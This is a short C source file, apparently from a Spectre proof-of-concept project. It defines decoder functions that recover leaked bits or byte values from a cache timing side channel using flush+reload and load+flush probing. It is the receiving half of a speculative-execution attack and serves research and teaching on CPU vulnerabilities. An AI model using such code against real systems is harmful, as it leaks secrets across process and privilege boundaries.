#include "../include/spectre.h"

uint64_t decode_flush_reload_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    uint32_t rand_i;
    for (uint32_t i = 0; i < bits_count; i++)
    {
        rand_i = (((i) * 4079) + 13) % (bits_count);
        if (is_cached_load((side_channel) + ((rand_i+1) * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (rand_i) % 8);
        }
    }
    return out;
}

uint64_t decode_load_flush_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    for (uint32_t i = 1; i < bits_count + 1; i++)
    {
        if (!is_cached_load((side_channel) + (i * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (i - 1) % 8);
        }
    }
    return out;
}

uint64_t decode_flush_reload_array_index(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint32_t element_count = powl(2, bits_count);
    uint64_t out = 0;
    uint32_t rand_i;
    for (uint32_t i = 0; i < element_count; i++)
    {
        rand_i = (((i) * 167) + 67) % element_count;
        // Index 0 is always cached because of training phase :/
        // But thats not an issue
        if (rand_i != 0 && is_cached_load((side_channel) + ((rand_i+1) * stride), threshold))
        {
            out = rand_i;
            break;
        }
    }
    return out;
}
